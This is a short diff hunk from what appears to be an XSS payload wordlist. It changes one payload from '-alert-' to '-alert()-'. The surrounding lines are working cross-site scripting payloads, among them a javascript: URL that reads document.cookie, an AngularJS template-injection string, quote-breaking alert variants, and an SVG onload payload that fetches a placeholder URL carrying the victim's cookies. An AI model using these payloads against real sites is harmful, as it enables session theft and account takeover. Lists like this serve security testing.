@@ -57,7 +57,7 @@ javascript:alert(document.cookie)
 {{$on.constructor('alert(1)')()}}
 &apos;-alert(1)-&apos;
 ${alert(1)}
-'-alert-'
+'-alert()-'
 \'-alert(1)//
 \"-alert(1)}//
 '"><svg/onload=fetch(`//url/${encodeURIComponent(document.cookie)}`)>
